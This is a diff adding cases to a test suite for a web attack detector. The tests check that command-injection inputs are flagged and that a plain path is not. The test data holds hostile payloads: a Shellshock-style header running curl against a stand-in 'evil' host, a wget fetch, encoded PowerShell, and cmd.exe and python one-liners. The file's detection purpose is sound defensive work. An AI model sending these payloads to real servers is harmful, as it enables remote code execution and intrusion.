@@ -83,6 +83,15 @@ describe("webAttackSignal", () => {
     expect(fires("/x?q=$(powershell -enc AAAA)")).toContain("cmd");
     expect(fires("/x?q=a|wget http://evil/x")).toContain("cmd");
   });
+  it("cmd: a tool named by its path is the tool — the Shellshock User-Agent shape", () => {
+    expect(
+      webAttackSignal("() { :; }; /bin/bash -c 'curl http://evil.example.invalid/x'", false)?.families,
+    ).toEqual(["cmd"]);
+    expect(fires("/x?q=;/usr/bin/python3 -c 'import os'")).toContain("cmd");
+    expect(fires("/x?cmd=C:\\Windows\\System32\\cmd.exe /c whoami")).toContain("cmd");
+    expect(fires("/docs/bin/bash/usage")).toEqual([]); // a path, not a command
+  });
+
   it("cmd: the free tier fires bare after any separator", () => {
     expect(fires("/x?q=;whoami")).toContain("cmd");
     expect(fires("/x?q=|whoami")).toContain("cmd");
